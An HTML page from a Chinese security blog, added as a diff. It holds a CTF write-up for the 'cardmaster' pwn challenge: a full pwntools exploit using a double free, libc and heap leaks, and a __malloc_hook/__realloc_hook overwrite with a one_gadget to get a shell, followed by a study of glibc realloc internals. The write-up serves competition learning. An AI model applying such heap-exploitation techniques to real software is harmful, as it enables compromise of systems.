@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="cardmaster赛时wp超了一小时才做出来。。。思路变换的太不灵活了 对于realloc也不够熟悉不过说实话这题就是纯靠动调猜出来的主要的思路就是利用double free来申请到main_chunk(即存储输出函数和存储字符串的堆块地址的chunk) 从而覆盖chunk中的指针 这样就可以泄露出libc地址 堆地址的话就在double free的时候泄露就行了  主要的时间卡在了泄露libc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯半决赛">
+<meta property="og:url" content="http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="cardmaster赛时wp超了一小时才做出来。。。思路变换的太不灵活了 对于realloc也不够熟悉不过说实话这题就是纯靠动调猜出来的主要的思路就是利用double free来申请到main_chunk(即存储输出函数和存储字符串的堆块地址的chunk) 从而覆盖chunk中的指针 这样就可以泄露出libc地址 堆地址的话就在double free的时候泄露就行了  主要的时间卡在了泄露libc">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844118.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844369.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251847647.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251848504.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251850489.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251853597.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901023.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901049.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251910145.png">
+<meta property="article:published_time" content="2024-11-23T07:36:04.000Z">
+<meta property="article:modified_time" content="2024-12-05T15:11:57.549Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844118.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>网鼎杯半决赛</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/19/house-of-some/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&text=网鼎杯半决赛"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&is_video=false&description=网鼎杯半决赛"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网鼎杯半决赛&body=Check out this article: http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&name=网鼎杯半决赛&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&t=网鼎杯半决赛"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#cardmaster"><span class="toc-number">1.</span> <span class="toc-text">cardmaster</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%9B%E6%97%B6wp"><span class="toc-number">1.1.</span> <span class="toc-text">赛时wp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0-realloc%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">后记 realloc详解</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        网鼎杯半决赛
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-23T07:36:04.000Z" class="dt-published" itemprop="datePublished">2024-11-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/wp/">wp</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="cardmaster"><a href="#cardmaster" class="headerlink" title="cardmaster"></a>cardmaster</h1><h2 id="赛时wp"><a href="#赛时wp" class="headerlink" title="赛时wp"></a>赛时wp</h2><p>超了一小时才做出来。。。思路变换的太不灵活了 对于realloc也不够熟悉<br>不过说实话这题就是纯靠动调猜出来的<br>主要的思路就是利用double free来申请到main_chunk(即存储输出函数和存储字符串的堆块地址的chunk) 从而覆盖chunk中的指针 这样就可以泄露出libc地址 堆地址的话就在double free的时候泄露就行了  主要的时间卡在了泄露libc这一步<br>拿到libc地址后 就是想办法覆盖输出函数指针了  但是试了很久都没找到办法像刚才一样来构造double free 最后试了出来 利用realloc来把0x30的chunk放到tcachebin中 然后调用初始化函数就可以申请出来两个0x30的chunk  然后edit的时候 就可以进入malloc那个分之  就能把0x30的chunk申请出来了 而且这个chunk还是可以自定义地址的 然后就是打malloc_hook了  三个ogg的条件正常都没有办法实现 这里用realloc和malloc相结合的办法可以打通</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io = process(&quot;./pwn&quot;)</span><br><span class="line">#io = remote(&quot;83.43.93.13&quot;,15000)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def init_card():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">def edit_card(count,number,level,payload):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;suit count:&quot;)</span><br><span class="line">    io.sendline(str(count))</span><br><span class="line">    io.recvuntil(&quot;digit range 1 - ?&quot;)</span><br><span class="line">    io.sendline(str(number))</span><br><span class="line">    io.recvuntil(&quot;randomize level:&quot;)</span><br><span class="line">    io.sendline(str(level))</span><br><span class="line">    io.recvuntil(&quot;new suite set:&quot;)</span><br><span class="line">    io.send(payload)</span><br><span class="line">def shuffle_card():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">def show_card():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line">def get_info():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1258)&#x27;)</span><br><span class="line">edit_card(0,1,100,&quot;2\n&quot;)</span><br><span class="line">io.recvuntil(&quot;suit count:&quot;)</span><br><span class="line">io.sendline(str(0))</span><br><span class="line">io.recvuntil(&quot;digit range 1 - ?&quot;)</span><br><span class="line">io.sendline(str(1))</span><br><span class="line">io.recvuntil(&quot;randomize level:&quot;)</span><br><span class="line">io.sendline(str(100))</span><br><span class="line">io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">io.sendline(&quot;2&quot;)</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1258)&#x27;)</span><br><span class="line">io.recvuntil(&quot;suit count:&quot;)</span><br><span class="line">io.sendline(str(0))</span><br><span class="line">io.recvuntil(&quot;digit range 1 - ?&quot;)</span><br><span class="line">io.sendline(str(1))</span><br><span class="line">io.recvuntil(&quot;randomize level:&quot;)</span><br><span class="line">io.sendline(str(100))</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_info()</span><br><span class="line">io.recvuntil(&quot;suit chara set:&quot;)</span><br><span class="line">heap_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">success(&quot;heap_addr :&quot;+hex(heap_addr))</span><br><span class="line">edit_card(300,0,100,&quot;\xa0&quot;)</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)</span><br><span class="line">edit_card(11,0,100,&quot;\xa0&quot;)</span><br><span class="line"># pause()</span><br><span class="line">edit_card(11,0,100,p64(heap_addr-0x3c8))</span><br><span class="line">edit_card(1,1,100,&quot;\xa0&quot;)</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x11FC)&#x27;)</span><br><span class="line">edit_card(1,1,100,&quot;a&quot;)</span><br><span class="line"># pause()</span><br><span class="line">init_card()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x11FC)&#x27;)</span><br><span class="line">edit_card(2,0,100,p64(heap_addr-0x640+0xa30))</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0xB10)&#x27;)</span><br><span class="line">get_info()</span><br><span class="line">io.recvuntil(&quot;suit chara set:&quot;)</span><br><span class="line">libc_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x3ebca0</span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc_addr))</span><br><span class="line"># # pause()</span><br><span class="line"></span><br><span class="line">edit_card(8,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(12,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(1,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(8,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(1,0,100,&quot;a&quot;)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">realloc_hook = libc_addr + libc.sym[&#x27;__realloc_hook&#x27;]</span><br><span class="line">onegadget_addr = libc_addr + 0x10a38c</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)</span><br><span class="line">edit_card(8,0,100,p64(realloc_hook-0x10))</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0xC1A)&#x27;)</span><br><span class="line">init_card()</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)</span><br><span class="line">realloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]</span><br><span class="line">edit_card(8,0,100,p64(0)*2+p64(onegadget_addr)+p64(realloc_addr+0x6))</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0xC1A)&#x27;)</span><br><span class="line">init_card()</span><br><span class="line"># pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="后记-realloc详解"><a href="#后记-realloc详解" class="headerlink" title="后记 realloc详解"></a>后记 realloc详解</h2><p>专门研究了一下realloc 发现还有平时不知道的很多用法<br>realloc函数主要用于重新分配内存空间 可以调整已分配的内存空间</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *realloc(void *ptr, size_t size)</span><br></pre></td></tr></table></figure>
+<p>ptr指向需要重分配的chunk指针  size表示的需要分配的大小<br>来看看正常情况下的realloc如何运作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//gcc -o test -g ./test.c</span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout, 0, 0, 0);</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    init();</span><br><span class="line">    char *ptr = malloc(0x30);</span><br><span class="line">    realloc(ptr,0x10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行realloc之前的ptr如下图所示<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844118.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844118.png" alt="image.png"></a><br>执行之后 原先的chunk就重新分配成了0x20 剩下的0x20被释放进入bin中<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844369.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844369.png" alt="image.png"></a><br>这里注意的是 虽然重分配的大小是0x10 按理来说0x30的chunk分配掉0x10 那剩余的实际大小应该是0x20 但是最终两个chunk的实际大小都是0x10 是为了考虑到不破坏原有的堆结构<br>此时如果把realloc函数的ptr参数修改为0 来看看会是什么效果<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251847647.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251847647.png" alt="image.png"></a><br>由于没有需要重分配的chunk 所以这里直接申请了一个新的chunk<br>如果把realloc函数的size参数修改为0<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251848504.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251848504.png" alt="image.png"></a><br>则会直接把chunk释放进入bin中<br>如果size的大小大于chunk原本的大小呢<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251850489.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251850489.png" alt="image.png"></a><br>则会直接扩大chunk的size<br>如果chunk1后面再跟一个chunk2来固定大小呢 这个时候chunk1没法直接向高地址扩大<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251853597.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251853597.png" alt="image.png"></a><br>可以看到取而代之的办法就是直接释放chunk1 然后重新申请一个满足size的chunk</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//gcc -o test -g ./test.c</span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout, 0, 0, 0);</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    init();</span><br><span class="line">    char *ptr = malloc(0x30);</span><br><span class="line">    char *ptr1 = malloc(0x30);</span><br><span class="line">    char *ptr2 = malloc(0x10);</span><br><span class="line">    free(ptr1);</span><br><span class="line">    realloc(ptr,0x30);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里猜测realloc重分配的逻辑是先释放再申请 这里先释放一个0x30大小的chunk 再进行realloc 看看重新分配后的指针是指向哪一个chunk<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901023.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901023.png" alt="image.png"></a><br>依然指向的是chunk0<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901049.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901049.png" alt="image.png"></a><br>和设想的有点不一样 这里去查看下realloc的注释<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251910145.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251910145.png" alt="image.png"></a><br>按照源码所说 当重分配的size大于原有的size时 会采用malloc-copy-free的操作序列 也就是先申请满足大小的chunk 再转移数据 最后释放原来的chunk<br>但是上面我们已经实验过 当tcachebin中存在满足大小的chunk时 他也不会去申请<br>哪怕把tcachebin换成unsortedbin也是同理<br>那还是得根据realloc的源代码来查看一下详细的逻辑<br>(以下源码版本为glibc2.35 中文注释为我所记)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *</span><br><span class="line">__libc_realloc (void *oldmem, size_t bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  INTERNAL_SIZE_T nb;         /* padded request size */</span><br><span class="line"></span><br><span class="line">  void *newp;             /* chunk to return */</span><br><span class="line"></span><br><span class="line">  if (!__malloc_initialized)   //检测堆是否初始化</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line"></span><br><span class="line">#if REALLOC_ZERO_BYTES_FREES  //这个的值默认为1 当bytes为0且指针不为空时 realloc相当于free函数</span><br><span class="line">  if (bytes == 0 &amp;&amp; oldmem != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); return 0;</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  /* realloc of null is supposed to be same as malloc */</span><br><span class="line">  if (oldmem == 0)   //当指针为空时 realloc相当于malloc函数</span><br><span class="line">    return __libc_malloc (bytes);</span><br><span class="line"></span><br><span class="line">  /* Perform a quick check to ensure that the pointer&#x27;s tag matches the</span><br><span class="line">     memory&#x27;s tag.  */</span><br><span class="line">  if (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    *(volatile char*) oldmem;</span><br><span class="line"></span><br><span class="line">  /* chunk corresponding to oldmem */   //获取内存块指针以及内存块大小</span><br><span class="line">  const mchunkptr oldp = mem2chunk (oldmem);</span><br><span class="line">  /* its size */</span><br><span class="line">  const INTERNAL_SIZE_T oldsize = chunksize (oldp);</span><br><span class="line"></span><br><span class="line">  if (chunk_is_mmapped (oldp))  //检测是否通过mmap方式分配的内存  malloc函数申请的内存空间是由brk得到的</span><br><span class="line">    ar_ptr = NULL;</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      MAYBE_INIT_TCACHE ();</span><br><span class="line">      ar_ptr = arena_for_chunk (oldp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* Little security check which won&#x27;t hurt performance: the allocator</span><br><span class="line">     never wrapps around at the end of the address space.  Therefore</span><br><span class="line">     we can exclude some size values which might appear here by</span><br><span class="line">     accident or by &quot;design&quot; from some intruder.  */</span><br><span class="line">  if ((__builtin_expect ((uintptr_t) oldp &gt; (uintptr_t) -oldsize, 0)   //检查内存块大小是否小于零以及指针是否对齐</span><br><span class="line">       || __builtin_expect (misaligned_chunk (oldp), 0)))</span><br><span class="line">      malloc_printerr (&quot;realloc(): invalid pointer&quot;);</span><br><span class="line"></span><br><span class="line">  if (!checked_request2size (bytes, &amp;nb))   //检查申请的bytes大小</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (chunk_is_mmapped (oldp))</span><br><span class="line">    &#123;</span><br><span class="line">      void *newmem;</span><br><span class="line"></span><br><span class="line">#if HAVE_MREMAP  //默认为0 作用是为1时让realloc使用mremap来重分配大chunk</span><br><span class="line">      newp = mremap_chunk (oldp, nb);</span><br><span class="line">      if (newp)</span><br><span class="line">    &#123;</span><br><span class="line">      void *newmem = chunk2mem_tag (newp);</span><br><span class="line">      /* Give the new block a different tag.  This helps to ensure</span><br><span class="line">         that stale handles to the previous mapping are not</span><br><span class="line">         reused.  There&#x27;s a performance hit for both us and the</span><br><span class="line">         caller for doing this, so we might want to</span><br><span class="line">         reconsider.  */</span><br><span class="line">      return tag_new_usable (newmem);</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line">      /* Note the extra SIZE_SZ overhead. */</span><br><span class="line">      if (oldsize - SIZE_SZ &gt;= nb)   //SIZE_SZ表示chunk的元数据 如果chunk大小大于bytes 就直接返回chunk指针</span><br><span class="line">        return oldmem;                         /* do nothing */</span><br><span class="line"></span><br><span class="line">      /* Must alloc, copy, free. */</span><br><span class="line">      newmem = __libc_malloc (bytes); //这里就是比较关键的逻辑了 如果原有的chunk空间不够重分配 那么就调用malloc(bytes) 然后把旧chunk的内容copy到新chunk</span><br><span class="line">      if (newmem == 0)</span><br><span class="line">        return 0;              /* propagate failure */</span><br><span class="line"></span><br><span class="line">      memcpy (newmem, oldmem, oldsize - CHUNK_HDR_SZ);</span><br><span class="line">      munmap_chunk (oldp);  //释放旧chunk</span><br><span class="line">      return newmem;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (SINGLE_THREAD_P)  //单线程情况下的重分配</span><br><span class="line">    &#123;</span><br><span class="line">      newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line">      assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line">      return newp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  //多线程</span><br><span class="line">  __libc_lock_lock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line">  </span><br><span class="line">  //内存分配失败时的异常处理</span><br><span class="line">  if (newp == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Try harder to allocate memory in other arenas.  */</span><br><span class="line">      LIBC_PROBE (memory_realloc_retry, 2, bytes, oldmem);</span><br><span class="line">      newp = __libc_malloc (bytes);</span><br><span class="line">      if (newp != NULL)</span><br><span class="line">        &#123;</span><br><span class="line">      size_t sz = memsize (oldp);</span><br><span class="line">      memcpy (newp, oldmem, sz);</span><br><span class="line">      (void) tag_region (chunk2mem (oldp), sz);</span><br><span class="line">          _int_free (ar_ptr, oldp, 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  return newp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>重点关注的部分就是malloc-copy-free这个流程了 当oldp的size不满足bytes的时候 就会触发 但是我们之前的实验却没有成功 不过因为libc_realloc函数中的mcf流程只存在于if (chunk_is_mmapped (oldp))这个分支中 需要chunk由mmap分配的才行 所以接下来需要接着分析int_realloc函数</p>
